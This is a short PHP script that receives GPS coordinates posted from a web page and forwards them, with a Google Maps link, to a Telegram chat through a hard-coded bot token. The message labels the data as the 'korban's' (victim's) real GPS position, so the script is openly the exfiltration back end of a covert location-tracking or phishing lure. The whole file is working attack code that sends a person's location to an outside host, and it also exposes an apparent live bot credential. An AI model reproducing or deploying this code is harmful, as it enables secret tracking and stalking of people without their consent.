<?php
$botToken = "8617014310:AAEidb6kIIlM4QLyoAMm5FMGskMSutKO6aU";
$chatId = "8753510792";
$input = file_get_contents('php://input');
parse_str($input, $data);
$lat = $data['lat'] ?? 'unknown';
$lon = $data['lon'] ?? 'unknown';
file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=📍 *REAL GPS KORBAN*%0ALat: $lat%0ALon: $lon%0AMaps: https://maps.google.com/?q=$lat,$lon&parse_mode=Markdown");
?>